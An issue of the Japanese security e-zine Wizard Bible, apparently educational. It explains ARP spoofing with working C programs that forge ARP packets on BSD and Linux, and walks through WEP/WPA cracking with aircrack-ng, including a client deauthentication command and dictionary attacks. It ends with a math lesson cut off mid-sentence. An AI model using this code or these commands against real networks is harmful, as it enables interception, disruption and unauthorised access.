# Wizardbible #51

***

## 第0章：目次

***

- 第1章: ARPスプーフィングについての考察と実装                     unya 著

- 第2章: WPA-TKIPのパスワード解析                                黒林檎 著

- 第3章: 基礎暗号学講座・第24回 〜有理素数の2平方和表現〜      IPUSIRON 著

- 第4章: お知らせ

- 第5章: 著者プロフィール


***

## 第1章: ARPスプーフィングについての考察と実装

著者：unya

***


### 0x01 はじめに

　ARPスプーフィングは古くからから存在しているにも関わらず、いまだに有効な
攻撃手段です。記憶の新しいところでは、さくらインターネットで2008年6月にAR
Pスプーフィング攻撃が発覚しました。
　今回は、ARPスプーフィングについて考察していき、最後に実装方法を掲載しま
す。幸いなことに、インターネットにはARPスプーフィングについて解説するサイ
トが数多く存在します。ARPスプーフィングとは何か、ということを理解するため
には、それらのサイトを参照することをおすすめします。
　ここでは、具体的なARPスプーフィングについての解説はしません。既存のツー
ルに頼ることなく、自らARPスプーフィングツールを作成し、実行することを目的
とした解説をしたいと思います。


### 0x02 テスト環境

　以下のオペレーティングシステムを使用してテストを実施しました。

OpenBSD 4.7 amd64
FreeBSD 8.1 amd64
NetBSD 5.1 amd64
Debian GNU/Linux 5.0.7 amd64


### 0x03 ARPについて

●3.1 ARPとは

　イーサネットで接続されたネットワーク機器同士が通信するにあたり、フレー
ムの宛先となるインタフェースを決定するのは48ビットのMACアドレスです。その
ため、TCP/IPを利用して通信するためには、ネットワーク層で使用する論理アド
レス（IPアドレス）とデータリンク層で使用する物理アドレス（MACアドレス）を
マッピングする機能が必要となります。この機能をARP（Address Resolution Pr
otocol）といいます。

●3.2 ARPキャッシュ

　IPアドレスとMACアドレスとのマッピング（アドレスの解決）がおこなわれると、
マッピング情報が保持されます。これをARPキャッシュといいます。保持される時
間は実装と設定に依存します。

●3.3 ARPヘッダーフォーマット

　ARPパケットの構造を理解するために、NetBSDのnet/arp.hから抜粋した構造体
を例に説明します。

```
struct  arphdr {
        uint16_t ar_hrd;        /* format of hardware address */
\#define ARPHRD_ETHER    1       /* ethernet hardware format */
\#define ARPHRD_IEEE802  6       /* IEEE 802 hardware format */
\#define ARPHRD_ARCNET   7       /* ethernet hardware format */
\#define ARPHRD_FRELAY   15      /* frame relay hardware format */
\#define ARPHRD_STRIP    23      /* Ricochet Starmode Radio hardware format */
\#define ARPHRD_IEEE1394 24      /* IEEE 1394 (FireWire) hardware format */
        uint16_t ar_pro;        /* format of protocol address */
        uint8_t  ar_hln;        /* length of hardware address */
        uint8_t  ar_pln;        /* length of protocol address */
        uint16_t ar_op;         /* one of: */
\#define ARPOP_REQUEST   1       /* request to resolve address */
\#define ARPOP_REPLY     2       /* response to previous request */
\#define ARPOP_REVREQUEST 3      /* request protocol address given hardware */
\#define ARPOP_REVREPLY  4       /* response giving protocol address */
\#define ARPOP_INVREQUEST 8      /* request to identify peer */
\#define ARPOP_INVREPLY  9       /* response identifying peer */
/*
 * The remaining fields are variable in size,
 * according to the sizes above.
 */
\#ifdef COMMENT_ONLY
        uint8_t  ar_sha[];      /* sender hardware address */
        uint8_t  ar_spa[];      /* sender protocol address */
        uint8_t  ar_tha[];      /* target hardware address */
        uint8_t  ar_tpa[];      /* target protocol address */
\#endif
\#define ar_sha(ap) (((char *)((ap)+1))+0)
\#define ar_spa(ap) (((char *)((ap)+1))+(ap)->ar_hln)
\#define ar_tha(ap) \
        (ntohs((ap)->ar_hrd) == ARPHRD_IEEE1394 \
                ? NULL : (((char *)((ap)+1))+(ap)->ar_hln+(ap)->ar_pln))
\#define ar_tpa(ap) \
        (ntohs((ap)->ar_hrd) == ARPHRD_IEEE1394 \
                ? (((char *)((ap)+1))+(ap)->ar_hln+(ap)->ar_pln) \
                : (((char *)((ap)+1))+(ap)->ar_hln+(ap)->ar_pln+(ap)->ar_hln))
} __packed;
```

　上記の構造体から、ARPパケットのフォーマットが以下のようになることが分か
ります。

 0                   1                   2                   3   
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             ar_hrd            |            ar_pro             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                4
|     ar_hln    |     ar_pln    |            ar_op              |2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             ar_sha                                                            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             ar_spa                            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             ar_tha                                                            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             ar_tpa                            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

ar_hrd
    ハードウェアアドレスの種類。イーサネットであれば1になる。
ar_pro
    変換されるプロトコルアドレスの種類。IPv4アドレスは0x0800となる。
ar_hln
    ハードウェアアドレスのサイズをバイト単位で指定する。イーサネットで使
用するアドレスは6バイトになる。
ar_pln
    論理アドレスのサイズをバイト単位で指定する。IPv4アドレスは4バイトに
なる。
ar_op
    ARPの動作を指定する。ARPリクエストなら1、リプライなら2、RARPリクエス
トなら3、RARPリプライならば4となる。
ar_sha
    送信元ハードウェアアドレス。ARPを送信するネットワーク機器のMACアドレ
スとなる。
ar_spa
    送信元プロトコルアドレス。ARPを送信するネットワーク機器のIPアドレスが
入る。
ar_tha
    送信先ハードウェアアドレス。このフィールドはリクエストとリプライで値
が変わる。
    ARPリクエスト…00:00:00:00:00:00もしくはff:ff:ff:ff:ff:ff
    ARPリプライ…ARPリクエストを行ったネットワーク機器のハードウェアアド
レス
ar_tpa
    送信先プロトコルアドレス。このフィールドはリクエストとリプライで意味
が変わる。
    ARPリクエスト…アドレス解決したいプロトコルアドレス
    ARPリプライ…ARPリクエストを行ったネットワーク機器のプロトコルアドレス


### 0x04 4. ARPスプーフィングとは

　TCP/IPをイーサネットLAN上で利用するためには、IPアドレスとMACアドレスを
マッピングする必要があることはすでに説明しました。ARPスプーフィングは、こ
のマッピング情報（ARPキャッシュ）を汚染します。イーサネットドライバは常に
MACアドレスを宛先として使用するため、汚染されたマッピング情報をもとにTCP
/IP通信をおこなうと、正しい送信先へ送信できなくなります。

●4.1 ARPキャッシュの汚染

　ARPキャッシュの各エントリが更新されるタイミングは、ARPリプライを受信し
た場合のみではありません。ARPキャッシュはARPリクエストを受信した場合でも
更新されます。
　以下の表は、FreeBSD 8.1とDebian GNU/Linux 5.0.7に対して条件を変えながら
ARPスプーフィングをおこなった結果です。

表4.1-1 ARPリクエストによるARPスプーフィング結果
+--------------------------------------------------------------------------------------------------+-------+
| 送信先MACアドレス | ar_spa（送信元IP） | ar_tpa（送信先IP）| FreeBSD                             | Linux |
+-------------------+--------------------+-------------------+-------------------------------------+-------+
| ブロードキャスト  | ARPキャッシュに有  | 自分宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
|-------------------|--------------------|-------------------|-------------------------------------|-------|
| ブロードキャスト  | ARPキャッシュに有  | 他人宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
|-------------------|--------------------|-------------------|-------------------------------------|-------|
| ブロードキャスト  | ARPキャッシュに無  | 自分宛て          | ar_spaをARPキャッシュに追加         | 〃    |
|-------------------|--------------------|-------------------|-------------------------------------|-------|
| ブロードキャスト  | ARPキャッシュに無  | 他人宛て          | 無視                                | 〃    |
|-------------------|--------------------|-------------------|-------------------------------------|-------|
| ユニキャスト      | ARPキャッシュに有  | 自分宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
|-------------------|--------------------|-------------------|-------------------------------------|-------|
| ユニキャスト      | ARPキャッシュに有  | 他人宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
|-------------------|--------------------|-------------------|-------------------------------------|-------|
| ユニキャスト      | ARPキャッシュに無  | 自分宛て          | ar_spaをARPキャッシュに追加         | 〃    |
|-------------------|--------------------|-------------------|-------------------------------------|-------|
| ユニキャスト      | ARPキャッシュに無  | 他人宛て          | 無視                                | 〃    |
+----------------------------------------------------------------------------------------------------------+

表4.1-2 ARPリプライによるARPスプーフィング結果
+----------------------------------------------------------------------------------------------------------+
| 送信先MACアドレス | ar_spa（送信元IP） | ar_tpa（送信先IP）| FreeBSD                             | Linux |
+-------------------+--------------------+-------------------+-------------------------------------+-------+
| ユニキャスト      | ARPキャッシュに有  | 自分宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
|-------------------|--------------------|-------------------|-------------------------------------|-------|
| ユニキャスト      | ARPキャッシュに有  | 他人宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
|-------------------|--------------------|-------------------|-------------------------------------|-------|
| ユニキャスト      | ARPキャッシュに無  | 自分宛て          | ar_spaをARPキャッシュに追加         | 無視  |
|-------------------|--------------------|-------------------|-------------------------------------|-------|
| ユニキャスト      | ARPキャッシュに無  | 他人宛て          | 無視                                | 〃    |
+----------------------------------------------------------------------------------------------------------+

　FreeBSDとLinuxの挙動の違いは、ARPリプライによるスプーフィング結果に表れ
ています。Linuxは自身のARPリクエストに対するリプライのみ受け入れます。
　次に、FreeBSD以外のBSDの挙動を調べるため、FreeBSDとLinuxで違いの現れた
パラメーターを使用し、各BSDに対してARPリクエストとARPリプライによるスプー
フィングを実行しました。

表4.1-3 ARPリクエストによるARPスプーフィング可否
+--------------------------------------+
| ターゲットOS     | バージョン | 結果 |
+------------------+------------+------+
| NetBSD           | 5.1        | ○   |
| FreeBSD          | 8.1        | ○   |
| OpenBSD          | 4.7        | ○   |
| Debian GNU/Linux | 5.0.7      | ○   |
+--------------------------------------+

表4.1-4 ARPリプライによるARPスプーフィング可否
+--------------------------------------+
| ターゲットOS     | バージョン | 結果 |
+------------------+------------+------+
| NetBSD           | 5.1        | ○   |
| FreeBSD          | 8.1        | ○   |
| OpenBSD          | 4.7        | ○   |
| Debian GNU/Linux | 5.0.7      | ×   |
+--------------------------------------+

　各BSDに挙動の違いは現れておらず、LinuxでのみARPリプライによるARPスプー
フィングに失敗しています。
　この結果から、ARPスプーフィングの実行には、送信先MACアドレスにユニキャ
ストを使用したARPリクエストによる方法が適していると考えます。
　送信先MACアドレスにユニキャストを使用するのは、ブロードキャストを使用す
るとブロードキャストドメイン全体に影響を及ぼすためです。


### 0x05 ARPスプーフィングの実装

　BSDとLinuxにおけるARPパケット送信のためのサンプルコードを掲載します。
今回のテストに使用したARPスプーフィングツールは、ぼくのサイトに置いてあり
ます。

●5.1 BSDコード

```
/*
 * bsdarpsend.c
 *
 * BSDでARP送信を行うためのサンプルプログラムです
 * エラーチェックは省略しています
 * FreeBSD 8.1 amd64/OpenBSD 4.7 amd64/NetBSD 5.1 amd64でコンパイル・動作の確認をおこないました
 */
 
\#include <sys/ioctl.h>
\#include <sys/types.h>
\#include <sys/socket.h>
\#if defined(_METBSD_SOURCE)
\# include <net/ethernet.h>
\#endif
\#include <net/if.h>
\#include <net/bpf.h>

\#include <netinet/in.h>
\#include <netinet/if_ether.h>

\#include <arpa/inet.h>

\#include <err.h>
\#include <string.h>
\#include <netdb.h>
\#include <unistd.h>
\#include <fcntl.h>
\#include <stdlib.h>
\#include <stdio.h>

/* 送信に使用するインタフェース	*/
char *interface = "em0";

/* 送信に使用するデバイス */
char *bpf = "/dev/bpf0";
/*
 * 送信元MACアドレス
 * ARPスプーフィングをおこなうと、ARPキャッシュにこのMACアドレスが登録されます
 */
char *src_mac = "00:00:33:44:55:66";
/*
 * 送信元IPアドレス
 * ARPスプーフィングをおこなうと、ARPキャッシュにこのIPアドレスが登録されます
 */
char *src_ip = "192.168.2.2";

/*
 * 送信先MACアドレス
 * 送信先に合わせて修正してください
 * ブロードキャストでARPスプーフィングを実行するとブロードキャストドメイン全体に影響します
 */
char *dst_mac = "ff:ff:ff:ff:ff:ff";
/*
 * 送信先IPアドレス
 * ARPリクエストの場合は問い合わせるIPアドレスになります
 */
char *dst_ip = "192.168.2.1";


int
resolve(const char *host, struct in_addr *addr)
{
  struct hostent *hoste;
  
  if (inet_aton(host, addr))
    return 0;
  if ((hoste = gethostbyname(host))) {
    memcpy(addr, hoste->h_addr_list[0], sizeof(struct in_addr));
      return 1;
  }
  return -1;
}

int
main(int argc, char *argv[])
{
  int sd;
  int res;
  struct in_addr src_addr, dst_addr;
  char arpbuf[sizeof(struct ether_header) + sizeof(struct ether_arp)];
  struct ether_header *eth;
  struct ether_arp *arp;
  struct ifreq ifr;

  /*
   * 送信に使用するためのBPFデバイスを開く
   */
  if ((sd = open(bpf, O_RDWR, 0)) < 0)
    err(EXIT_FAILURE, "open");
  /*
   * /dev/bpfXX とネットワークインタフェースを紐付ける
   */
  memset(&ifr, 0, sizeof(struct ifreq));
  strlcpy(ifr.ifr_name, interface, sizeof(ifr.ifr_name));
  if (ioctl(sd, BIOCSETIF, &ifr) < 0)
    err(EXIT_FAILURE, "ioctl");

  /*
   * ホスト名/IPアドレスをバイナリに変換
   * エラーチェックは省略しています
   */
  resolve(src_ip, &src_addr);
  resolve(dst_ip, &dst_addr);

  /*
   * イーサネットヘッダーの作成
   * ether_aton()のエラーチェックは省略しています
   */
  eth = (struct ether_header *)arpbuf;
  memcpy(eth->ether_dhost, ether_aton(dst_mac), sizeof(eth->ether_dhost));
  memcpy(eth->ether_shost, ether_aton(src_mac), sizeof(eth->ether_shost));
  eth->ether_type = htons(ETHERTYPE_ARP);

  /*
   * ARPヘッダーの作成
   */
  arp = (struct ether_arp *)(arpbuf + sizeof(struct ether_header));
  arp->arp_hrd = htons(ARPHRD_ETHER);    /* ハードウェアアドレスの種類 */
  arp->arp_pro = htons(ETHERTYPE_IP);    /* 論理アドレスの種類         */
  arp->arp_hln = ETHER_ADDR_LEN;         /* MACアドレスのサイズ        */
  arp->arp_pln = sizeof(struct in_addr); /* 論理アドレスのサイズ       */
  arp->arp_op = htons(ARPOP_REQUEST);    /* ARPリクエスト              */
  /* ARPペイロード部分 */
  memcpy(arp->arp_sha, eth->ether_shost, sizeof(arp->arp_sha));
  memcpy(arp->arp_tha, eth->ether_dhost, sizeof(arp->arp_tha));
  memcpy(arp->arp_spa, &src_addr, sizeof(arp->arp_spa));
  memcpy(arp->arp_tpa, &dst_addr, sizeof(arp->arp_tpa));

  res = write(sd, arpbuf, sizeof(arpbuf));
  if (res < 0)
    perror("write");
  else
    printf("%d bytes send\n", res);

  close(sd);

  return 0;
}
```

●5.2 Linuxコード

```
/*
 * linarpsend.c
 *
 * linuxでARP送信をおこなうためのサンプルプログラムです
 * エラーチェックは省略しています
 * Debian GNU/Linux 5.0.7 amd64でコンパイル・動作の確認をおこないました
 */

\#include <sys/types.h>
\#include <sys/socket.h>

\#include <netinet/in.h>
\#include <netinet/if_ether.h>

\#include <err.h>
\#include <stdio.h>
\#include <stdlib.h>
\#include <unistd.h>
\#include <string.h>
\#include <netdb.h>

/* 送信に使用するインタフェース */
char *interface = "eth0";
/*
 * 送信元MACアドレス
 * ARPスプーフィングをおこなうと、ARPキャッシュにこのMACアドレスが登録されます
 */
char *src_mac = "00:00:33:44:55:66";
/*
 * 送信元IPアドレス
 * ARPスプーフィングをおこなうと、ARPキャッシュにこのIPアドレスが登録されます
 */
char *src_ip = "192.168.2.2";

/*
 * 送信先MACアドレス
 * 送信先に合わせて修正してください
 * ブロードキャストでARPスプーフィングを実行するとブロードキャストドメイン全体に影響します
 */
char *dst_mac = "ff:ff:ff:ff:ff:ff";
/*
 * 送信先IPアドレス
 * ARPリクエストの場合は問い合わせるIPアドレスになります
 */
char *dst_ip = "192.168.2.1";

int
resolve(const char *host, struct in_addr *addr)
{
  struct hostent *hoste;
    
  if (inet_aton(host, addr))
    return 0;
  if ((hoste = gethostbyname(host))) {
    memcpy(addr, hoste->h_addr_list[0], sizeof(struct in_addr));
    return 1;
  }
  return -1;
}

int
main(int argc, char *argv[])
{
  int sd;
  int res;
  struct in_addr src_addr, dst_addr;
  char arpbuf[sizeof(struct ether_header) + sizeof(struct ether_arp)];
  struct ether_header *eth;
  struct ether_arp *arp;
  struct sockaddr to;
  socklen_t tolen = sizeof(struct sockaddr);

  /* 
   * 古い実装です
   * 現在はpacket(7)が推奨されています
   */
  if ((sd = socket(PF_PACKET, SOCK_PACKET, htons(ETH_P_ALL))) < 0)
    err(EXIT_FAILURE, "socket");

  /*
   * ホスト名/IPアドレスをバイナリに変換
   * エラーチェックは省略しています
   */
  resolve(src_ip, &src_addr);
  resolve(dst_ip, &dst_addr);

  /*
   * イーサネットヘッダーの作成
   * ether_aton_r()のエラーチェックは省略しています
   */
  eth = (struct ether_header *)arpbuf;
  ether_aton_r(dst_mac, eth->ether_dhost);
  ether_aton_r(src_mac, eth->ether_shost);
  eth->ether_type = htons(ETHERTYPE_ARP);

  /*
   * ARPヘッダーのパラーメーターはnet/if_arp.hを参照
   */
  arp = (struct ether_arp *)(arpbuf + sizeof(struct ether_header));
  arp->arp_hrd = htons(ARPHRD_ETHER);    /* ハードウェアアドレスの種類 */
  arp->arp_pro = htons(ETHERTYPE_IP);    /* 論理アドレスの種類         */
  arp->arp_hln = ETH_ALEN;               /* MACアドレスのサイズ        */
  arp->arp_pln = sizeof(struct in_addr); /* 論理アドレスのサイズ       */
  arp->arp_op = htons(ARPOP_REQUEST);    /* ARPリクエスト              */
  /* ARPペイロード部分 */
  memcpy(arp->arp_sha, eth->ether_shost, sizeof(arp->arp_sha));
  memcpy(arp->arp_tha, eth->ether_dhost, sizeof(arp->arp_tha));
  memcpy(arp->arp_spa, &src_addr, sizeof(arp->arp_spa));
  memcpy(arp->arp_tpa, &dst_addr, sizeof(arp->arp_tpa));

  memset(&to, 0, sizeof(struct sockaddr));
  to.sa_family = PF_PACKET;
  strncpy(to.sa_data, interface, sizeof(to.sa_data)-1);

  res = sendto(sd, arpbuf, sizeof(arpbuf), 0, (struct sockaddr *)&to, tolen);
  if (res < 0)
    perror("sendto");
  else
    printf("%d bytes send\n", res);

  close(sd);

  return 0;
}
```

●5.3 BSDとLinuxでの実装の違い

　デバイスドライバレベルで生のパケットを送信するにあたり、BSDとLinuxの実
装の違いは、以下の2点です。

  - BSDがBPFを使用するのに対して、Linuxはソケットを使用する。
  - BSDがwrite(2)を使用して送信するのに対して、Linuxはsendto(2)を使用する。


### 0x06 最後に

　ARPスプーフィングは、それ自体では通信妨害を引き起こすのみです。汚染され
たARPキャッシュを参照して送信先を決定したフレームは、正しい送信先へ向かわ
ないためです。ARPスプーフィングは、あくまでも本格的な攻撃のための第一歩に
過ぎません。さくらインターネットではwebサーバーからの応答パケットが改ざん
（iframeタグの挿入）されました。このような攻撃を成立させるためには、ARPス
プーフィングやパケットの改ざん以外にも手順が必要となります。それらはARPス
プーフィングとはまた別のテクニックが必要となり、攻撃内容によっては難易度
が上がります。
　詳細な攻撃手順やテクニックについての解説は、また別の機会にとっておくこ
とにします。


### 0x07 参考文献

[1]「詳解TCP/IP〈Vol.1〉プロトコル」ピアソンエデュケーション


### 0x08 関連URL

[1]ARPを利用したローカルエリアネットワークにおける不正接続の排除
    http://www.sfc.wide.ad.jp/rg/2004s/term/material/11/2004S_TermProject_macchan_07-29.pdf
[2]ARPスプーフィングで通信傍受！ | The Weekly Herald
    http://herald.jugem.jp/?eid=67
[3][ethna-users:0969] ML保管庫のページに変なiframeが埋め込まれている件に
ついて
    http://ml.ethna.jp/pipermail/users/2008-June/000968.html
[4]データセンタ内のARP spoofing攻撃で通信改ざんが発生、対策の定石は? - ス
ラッシュドット・ジャパン
    http://slashdot.jp/security/article.pl?sid=08/06/05/008238
[5]［ARPスプーフィング］他のマシンあての通信を乗っ取り，監視強化が先決 -
 ぜい弱性に揺らぐインターネット：ITpro
    http://itpro.nikkeibp.co.jp/article/COLUMN/20090225/325452/



***

## 第2章: WPA-TKIPのパスワード解析

著者：黒林檎

***


### 0x00 はじめに

　近年一般に復旧し始めている無線LANですが、危険危険といえど何故危険なのか？
そもそも何故解析できるのか？
　Wizard Bibleを見ている皆さんは当たり前と思ってるかもしれませんが、一部
の知らない人が読んでくれてることを願います。
　一般的な対策としては、無線LANの暗号化方式をWPAに変えることといわれてい
ますが、「本当にそれで攻撃の対策が出来るのでしょうか？」ということを考え
ていきたいです。

### 0x01 無線LANの暗号化方法

①WEP
　無線LAN初期の暗号方式の規格であり、脆弱性があり容易に解析ができます。脆
弱性の意味はhttp://e-words.jp/w/E88486E5BCB1E680A7.htmlを参照してください。

②WPA
　WEPを強化した暗号化の規格です。暗号鍵を定期的に更新するTKIPを導入してる
などで、WEPよりかは解析が困難になった。

③WPA2
　WPAの新バージョンです。米標準技術局(NICT)が定めた暗号化標準のAESを採用
しています。AESとはWEP・WPA（一部AESに変更可）より強力になった暗号化方式
です。


### 0x02 WEPの仕組み

　WEPの暗号アルゴリズムはRC4という規格が使われています。
　RC4の暗号鍵の基になるWEPキーは40/104ビットの長さがあり、このWEPキーは事
前にAPと端末間での共有が必要です。WEPキーに24ビットの初期ベクター（IV）を
加えたものが暗号鍵になります。

　WEPで使われているRC4（暗号化アルゴリズム）はストリーム暗号なので暗号鍵
を初期値とし擬似乱数列を作成して、平文とその擬似乱数列でXOR（排他的論理和）
をとることにより暗号文を作ります。なお、平文には送信データ＋CRC32（巡回冗
長検査）で計算されたハッシュの値が使用されます。

　暗号化したデータは受信者が所持しているWEPキーで送信されて来たIVを使って
復号します。

### 0x03 WEPに対する攻撃法

　WEPにはいくつかの脆弱性があり、以下の攻撃が可能になります。

  - IVコリジョン攻撃
　同じIVが一巡するのでそれを再利用します。

  - PTW攻撃
　キーストリームから鍵を推定する鍵回復攻撃です。しかしこいつには対象のパ
ケットが必要になるという弱点があります。

  - リプレイ攻撃
　偽造パケットを認証させる攻撃です。

  - フラグメンテーション攻撃
　IPフラグメントの再構成処理に関係する攻撃です。

  - ビットフリッピング攻撃
　パケットキャプチャして、変更・改ざんし、サーバーへ送る攻撃です。

  - FMS攻撃
　RC4が作る擬似乱数列の先頭部分にバラツキが少ないことを利用する攻撃です。
VIがある種の条件を満たす場合、鍵を5%の確率で推測できます。

### 0x04 もっと簡単にWEPの駄目駄目を語ると

1：鍵長が短い
2：鍵の配布メカニズムがなく同一キーを再利用するなど
3：通信統計をとって解析する攻撃に弱い

### 0x05 WPAの大まかな説明

　WPAはWEPより優れている暗号方式と世間一般で言われていますが、これは間違
ってないだろう。
　WEPなんぞオタッキーな小学生でも解析出来てします。だって4万パケット集め
てaircrack-ngで解析させてまえば一発で出てしまう…。
　それに対してWPAは何万何千パケット集めようが認証時に4つのパケットを収集
しない限り解析は不可能です。まぁ悪人なら任意にAPと端末の認証切って再認証したところを…ｗ。

### 0x06 WPAって何だ？

　WPAには二つのTKIPとAESという奴があるがどーゆう違いがあるのでしょうか？
　TKIPはキーを自動的に変更して暗号化を行うものです。128ビットの一時キーを
もとにストリームが作成されるわけです。それに一万パケット毎に一時キーを変
更しているので解読を困難きわまりないものにします。ただ暗号化アルゴリズム
に皆おなじみRC4を使っているのは変更ありません。
　それに対してAESは暗号化アルゴリズムである、セキュリティープロトコルちゃ
いまっせェーｗ。AESはセキュリティープロトコルとしてCCMPという物を使います。
　暗号鍵の長さは128ビットで、IVの長さは48ビットです。
　ついでに話は長くなるがWPAは暗号化アルゴリズム以外に認証方法が違います。

①WPA-EAP
②WPA-PSK

　EAPは外部認証サーバーなどを使用してIEEE 802.1xによる認証が利用できる、
おもに企業などが使う方式です
　PSKは主に個人向けで事前に共有キーによる端末との認証を行う方式です。

### 0x07 WPAに攻撃！

　WPAといってもTKIPの方です。
　基本的な暗号方法は同じためパケットの末尾から（ICVから）一文字ずつ解読す
るchopchopが成立するわけですが…。TKIPになると解析成功率は格段に下がるわ
けです。それにもし解析出来ても解析した鍵はMICの改竄された鍵なわけで、暗号
解読キーの入手はできません。よってパケット解読にも至りません。

### 0x08 WPA(TKIP)のおおまかな解析方法

　0x07を読んで疑問に思った方いると思います。「あれ？俺WPA解析できたぞ？」
って人。確かに解析は可能…です。
　大まかに言ってしまうと。SSIDとパスフレーズ（PSK)の辞書ファイルを用意し
ます。
　そしてパケットキャプチャーで手に入れた4ウェイ・ハンドシェークのデータを
用意した辞書でパスフレーズを割り出します。
　そーゆう流れ出WPAの解析をします。

### 0x09 APの管理者はどーゆう対処をすればよいのか

1：WEP・WPA(TKIP)を使ってる方は、WPA(AES)かWPA2（AES)に変更しましょう

2：TKIPを使用してる奴は鍵更新の間隔を出来るだけ小さくしましょう。

3：パスワードは出来るだけ忘れない程度で長文！これだけで解読が困難になりま
す。

4：WEPを使ってる方は今すぐ買い換えましょう＾＾；

### 0x0A 実践Crack

　WEPの解析からWPAの解析しちゃいましょう＾＾；
　結構前に日本橋でGSKYなる違法無線LANカード販売で人気上昇なうなBack trac
k！多くの人はGUIバージョン（？）のSpoonWepを使ってクラックしてるんじゃな
いでしょうか？
いや…知りませんよ(汗…。だってGSKY使ってないもんｗ

　今回はコマンドでやりましょう！

　以下に示すものを用意します。

  - aircrack-ngに対応している無線LANカードか無線LAN内臓PC
  - Back trackのどのシリーズでも可(推奨はR１）（私はBT R1を使用してます）
  - 自分の環境でやってると思いますので、WPAを使ってる方はWPAのパスが書いて
ある辞書

　それでは解析方法を紹介します。

1：まず無線LANアダプタを確かめよう（不要だと思うが$や\#は入力するなよｗ）。

$ iwconfig

2：モニターモードに移行します。

$ airmon-ng start wlan0

　私の環境ではwlan0…。多くの人はwlan0でしょう…。

3：無線LAN受信範囲にあるAPを確認します。

$ airodump-ng wlan0

　ここでAPが表示されない人は出直せ…ｗ

4：パケットを収集します。

$ airodump-ng --channel [APチャンネル] --bssid [APMACアドレス] -w [ファイル名] wlan0

　ファイル名はkurione.capのように拡張子をcapにすること！

5：解析を実行します。

$ aircrack-ng kurione-01.cap

 ここでパスが出なかった人は5,000パケット毎に自動的にクラックが開始されま
す。キャプチャー続けていればですが…。

　以上がWEPの解析方法です。
　これからこの基本事項に少しプラスして、WPAの解析に入ります…。

### 0x0B 実践WPAクラック（続

　今回の筆者の実験環境はWPA-PSKです。
　まず基本から思い出そう…。
　WPAの解析方法にはAPと端末の接続を切断してやり4パケット収集しなければな
りません…。もちろん再接続するのをじぃーーーと待っていてもいいのですけど
ね…ｗ
　今回はそんな江戸時代染みた事はしません！現代風にやってみましょう！現代
風に！ｗ
　0x0Aのステップ4までは方法は同じです。
　ここで必殺aireplay攻撃です（キリッ

1：前回のWEPクラックでのairodumpを用いたパケットキャプチャーまでは同じです。

2：ここでAPと端末間の接続を切ります。

$ aireplay-ng -0 1 -a [APMACアドレス] -c [クライアントMACアドレス] wlan0

　これが成功して再接続した場合、勝手に端末が再接続したりユーザーが再接続
したりで、クラインとAPの間で認証パケットが飛ぶんですねー。これをキャプチ
ャーすれば半分は成功です！成功したらパケットキャプチャー画面右上にある異
変が現れますｗ（これは成功してからのお楽しみですｗ）

3：それではクラックを開始します。ファイル名は先ほどと変わっていません。

\# aircrack-ng kurione-01.cap -w kurione.txt　wlan0

　なかなかパケットがーって人のためにおまけです。

$ aireplay-ng -3 -b [APMACアドレス] wlan0

　これでクライアント（正規）がARPさえ送れば…ｗパケットキャプチャーできた
データが増えてきます。

### 0x0C おまけ

　ubuntuじゃあ管理者権限を求められるようですね(汗）自分はBTでしかaircrac
k-ngを動かさないので知りませんでした。。。
　ubuntuの場合は・・・

sudo -i
パスワード入力
airmon-ng start wlan0

　何故管理者権限を使うのか？というと・・・
　ネットワークをモニタリングするのにpcapを使います。これの実行に、管理者
権限を要るわけです＾＾；



***

## 第3章: 基礎暗号学講座・第24回 〜有理素数の2平方和表現〜

著者：IPUSIRON

***


### 0x01 はじめに

　久しぶりの暗号講座なので、新しい暗号理論の紹介ではなく、数学の定理を1つ
だけ紹介したい（今までの数学の復習にもなるはず）。
　今回の記事を読むにあたり、前提となる知識は次に示すものである。

  - 合同式：WB32
  - 環：WB31
  - 平方剰余：WB43
  - オイラー規準：WB43
  - 補充法則：WB44
  - 平方剰余の相互法則：WB44


### 0x02 2次式を考察する

　x,yをZから選択し、2次式x^2+y^2の計算結果がどうなるか調べる。

[1]y=1のとき

 x | x^2+1^2
---+---------------
 1 | 1^2+1=2
 2 | 2^2+1=5
 3 | 3^2+1=10=2・5
 4 | 4^2+1=17

[2]y=2のとき

 x | x^2+2^2
---+-------------------
 1 | 1^2+2^2=5
 2 | 2^2+2^2=8=2^3
 3 | 3^2+2^2=13
 4 | 4^2+2^2=20=2^2・5

[3]y=3のとき

 x | x^2+3^2
---+-------------------
 1 | 1^2+3^2=10=2・5
 2 | 2^2+3^2=13
 3 | 3^2+3^2=18=2・3^2
 4 | 4^2+3^2=25=5^2

[3]y=4のとき

 x | x^2+4^2
---+-------------------
 1 | 1^2+4^2=17
 2 | 2^2+4^2=20=2^2・5
 3 | 3^2+4^2=25=5^2
 4 | 4^2+4^2=32=2^5

　2次式の結果の中で素数のものを抽出すると次に示すものである。

{2,5,13,17}

　これらから偶素数の2を除くと、1型の素数（4で割ると1余る素数）になってい
る。すべての1型の素数が登場していることはわからないが、少なくとも17以下の
